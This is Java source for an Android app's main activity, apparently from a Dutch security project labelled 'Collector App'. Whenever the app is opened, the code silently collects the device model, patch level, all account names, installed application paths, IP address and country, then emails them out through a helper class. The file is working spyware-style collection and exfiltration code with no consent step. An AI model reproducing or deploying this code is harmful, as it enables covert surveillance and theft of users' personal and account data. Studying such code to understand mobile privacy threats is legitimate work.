package be.lennix.beveiligingproject;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.StrictMode;
import android.os.UserHandle;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;

import java.io.FilenameFilter;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    String messages = "";
    private EmailSender sender = new EmailSender();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        gatherInfo();
        sendEmail();
    }

    private void sendEmail(){
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

        StrictMode.setThreadPolicy(policy);
        //Log.e("messages: ", messages);
        sender.sendEmail("Collector App: " + new Timestamp(System.currentTimeMillis()).toString() + "from device: " + Build.MODEL, messages);
    }

    private void gatherInfo(){

        // System Info

        addInfo("Device Model: " + Build.BRAND + " " + android.os.Build.MODEL);
        addInfo("android.os.Build.USER: " + Build.USER);
        addInfo("android.os.Build.VERSION.RELEASE: " + Build.VERSION.RELEASE);
        addInfo("android.os.Build.VERSION.SECURITY_PATCH: " + Build.VERSION.SECURITY_PATCH);
        addInfo("Installed applications: " + getApplicationlist());


        addInfo("Device Account: " + getGoogleAccountInfo());

        // Location
        addInfo("Local IP address: " + getLocalIpAddress());
        addInfo("Sim Card Country: " + getUserCountry(this));
        addInfo("Network Country: " + getUserCountryNetwork(this));


    }

    private String getGoogleAccountInfo() {
        String value = "";

        Account[] accounts = AccountManager.get(getBaseContext()).getAccounts();
        for (Account account : accounts) {

            value += account.name + " ";
        }

        return value;
    }

    public static String getUserCountry(Context context) {
        try {
            final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            final String simCountry = tm.getSimCountryIso();
            if (simCountry != null && simCountry.length() == 2) { // SIM country code is available
                return simCountry.toLowerCase(Locale.US);
            }
            else if (tm.getPhoneType() != TelephonyManager.PHONE_TYPE_CDMA) { // device is not 3G (would be unreliable)
                String networkCountry = tm.getNetworkCountryIso();
                if (networkCountry != null && networkCountry.length() == 2) { // network country code is available
                    return networkCountry.toLowerCase(Locale.US);
                }
            }
        }
        catch (Exception e) { }
        return null;
    }

    public static String getUserCountryNetwork(Context context) {
        try {
            final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            final String simCountry = tm.getNetworkCountryIso();
            if (simCountry != null && simCountry.length() == 2) { // SIM country code is available
                return simCountry.toLowerCase(Locale.US);
            }
            else if (tm.getPhoneType() != TelephonyManager.PHONE_TYPE_CDMA) { // device is not 3G (would be unreliable)
                String networkCountry = tm.getNetworkCountryIso();
                if (networkCountry != null && networkCountry.length() == 2) { // network country code is available
                    return networkCountry.toLowerCase(Locale.US);
                }
            }
        }
        catch (Exception e) { }
        return null;
    }

    private String getApplicationlist() {

        ArrayList<String> applications = new ArrayList<String>();

        List<ApplicationInfo> list = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
        for(ApplicationInfo i : list){
            applications.add(i.sourceDir);
        }



        return applications.toString();
    }

    public String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());

                        return ip;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.e("problem fetching ip: ", ex.toString());
        }
        return "None Found";
    }

    private void addInfo(String info){

        messages = messages + info + "\n\n";
    }
}
